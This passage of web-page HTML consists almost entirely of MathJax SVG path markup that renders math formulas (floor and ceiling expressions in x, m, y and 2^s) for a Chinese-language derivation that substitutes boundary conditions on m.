344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2006,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g><g data-mml-node="mo" transform="translate(2727.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3783.6,0)"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="mfrac" transform="translate(4227.6,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(1516.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msup" transform="translate(959.9,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,289) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><rect width="2594.4" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(7062,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g><g data-mml-node="mo" transform="translate(7783.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(8839.6,0)"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="mfrac" transform="translate(9283.6,0)"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(1516.4,0)"><path data-c="2308" d="M174 734Q178 746 190 750H298H369Q400 750 411 747T422 730T411 713T372 709Q365 709 345 709T310 710H214V-235Q206 -248 196 -250Q192 -250 189 -249T184 -247T180 -244T178 -241T176 -237T174 -234V734Z"></path></g><g data-mml-node="msup" transform="translate(1960.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2875.1,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(3375.1,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3865.1,0)"><path data-c="2309" d="M21 717T21 730T32 746T75 750H147H256Q266 742 269 735V-235Q262 -248 251 -250Q247 -250 244 -249T239 -247T235 -244T233 -241T231 -237T229 -234V710H133Q119 710 99 710T71 709Q43 709 32 713Z"></path></g></g><g data-mml-node="msup" transform="translate(1917.2,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,289) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><rect width="4509.1" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(14032.6,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g></g></g></svg></mjx-container></span> 代入m的边界条件： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="24.868ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10991.5 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(914.6,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(1414.6,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2182.4,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mo" transform="translate(3238.2,0)"><path data-c="2308" d="M174 734Q178 746 190 750H298H369Q400 750 411 747T422 730T411 713T372 709Q365 709 345 709T310 710H214V-235Q206 -248 196 -250Q192 -250 189 -249T184 -247T180 -244T178 -241T176 -237T174 -234V734Z"></path></g><g data-mml-node="msup" transform="translate(3682.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(4596.8,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(5096.8,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5586.8,0)"><path data-c="2309" d="M21 717T21 730T32 746T75 750H147H256Q266 742 269 735V-235Q262 -248 251 -250Q247 -250 244 -249T239 -247T235 -244T233 -241T231 -237T229 -234V710H133Q119 710 99 710T71 709Q43 709 32 713Z"></path></g><g data-mml-node="mo" transform="translate(6308.6,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="msup" transform="translate(7364.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(8279,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(8779,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(9491.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(10491.5,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></span> 即： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="34.384ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 15197.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(572,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(1072,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1784.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2784.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3562.2,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mo" transform="translate(4618,0)"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="mi" transform="translate(5062,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(5856.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(6356.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(7234.4,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="msup" transform="translate(7734.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 